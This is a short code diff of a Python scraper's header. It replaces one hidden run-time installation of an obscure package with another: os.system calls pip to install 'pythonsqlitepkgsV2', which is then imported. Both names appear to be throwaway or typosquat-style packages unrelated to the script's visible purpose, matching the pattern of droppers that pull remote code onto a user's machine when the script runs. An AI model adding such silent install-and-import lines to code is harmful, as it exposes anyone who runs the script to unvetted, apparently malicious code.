@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
